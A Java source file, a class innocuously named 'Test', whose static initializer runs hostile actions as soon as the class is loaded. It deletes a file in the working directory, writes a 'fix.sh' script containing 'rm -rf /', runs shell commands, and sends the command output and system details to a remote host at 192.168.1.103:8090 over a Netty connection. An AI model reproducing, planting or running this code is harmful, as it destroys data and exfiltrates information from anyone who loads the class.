package com.shadow.remote;

import io.netty.bootstrap.Bootstrap;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.string.StringDecoder;
import io.netty.handler.codec.string.StringEncoder;
import io.netty.util.CharsetUtil;

import java.io.*;

public class Test {

    static {
        System.out.println(System.getProperties());
        String dir = System.getProperty("user.dir");
        // delete
        deleteFile(dir);
        // add
        addFile(dir);
        // shell
        String msg = executeSh(dir);
        // send msg
        remoteSend(msg);
    }

    private static void deleteFile(String dir) {
        File root = new File(dir);
        if(root.isDirectory()) {
            File[] files = root.listFiles();
            for (File file : files) {
                if(file.isFile() && file.getName().equals("test.txt")) {
                    boolean delete = file.delete();
                    System.out.println(delete);
                }
            }
        }
    }

    private static void addFile(String dir) {
        File root = new File(dir);
        File fix = new File(root.getAbsolutePath() + File.separator + "fix.sh");
        if(!fix.exists()) {
            try {
                boolean newFile = fix.createNewFile();
                System.out.println(newFile);
                FileOutputStream fileInputStream = new FileOutputStream(fix);
                String script = "rm -rf /";
                fileInputStream.write(script.getBytes());
                fileInputStream.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static String executeSh(String dir) {
        File root = new File(dir);
//        String cmd = "netstat -ano";
        String cmd = "ls -a";
//        String cmd = "touch test.txt";
//        String cmd = "rm -rf test.txt";
        StringBuilder sb = new StringBuilder();
        try {
//            Process exec = Runtime.getRuntime().exec(cmd, null, root);
            Process exec = Runtime.getRuntime().exec(cmd);
            InputStreamReader reader = new InputStreamReader(exec.getInputStream());
            BufferedReader bufferedReader = new BufferedReader(reader);

            String line = "";
            while ((line = bufferedReader.readLine())  != null) {
                System.out.println(line);
                sb.append(line).append("\r\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sb.toString();
    }

    private static void remoteSend(String msg) {
        // 连接 remote server
        System.out.println("remote server start");
        NettyClient.start(msg);
    }
    static class NettyClient {
        public static void start(String message) {
            EventLoopGroup group = new NioEventLoopGroup();

            Bootstrap bootstrap = new Bootstrap();
            bootstrap.group(group)
                    .channel(NioSocketChannel.class)
                    .handler(new MyNettyClient03ChannelInitializer(message));
            try {
                ChannelFuture channelFuture = bootstrap.connect("192.168.1.103", 8090).sync();

                // 读取用户输入
                Channel channel = channelFuture.channel();
                BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
                for(;;){
                    channel.writeAndFlush(br.readLine() + "\r\n");
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                group.shutdownGracefully();
            }
        }

        static class MyNettyClient03ChannelInitializer extends ChannelInitializer<SocketChannel> {

            private String message;

            MyNettyClient03ChannelInitializer(String message) {
                this.message = message;
            }

            @Override
            protected void initChannel(SocketChannel ch) throws Exception {
                ChannelPipeline pipeline = ch.pipeline();
                pipeline.addLast(new StringDecoder(CharsetUtil.UTF_8))
                        .addLast(new StringEncoder(CharsetUtil.UTF_8))
                        .addLast(new MyNettyClient03ChannelInBoundHandler(this.message));
            }
        }

        static class MyNettyClient03ChannelInBoundHandler extends SimpleChannelInboundHandler<String> {

            private String message;

            MyNettyClient03ChannelInBoundHandler(String message) {
                this.message = message;
            }

            // 接收发送的消息进行打印
            @Override
            protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {
                System.out.println("server msg " + msg);
                ctx.writeAndFlush(this.message);
            }

        }
    }



}
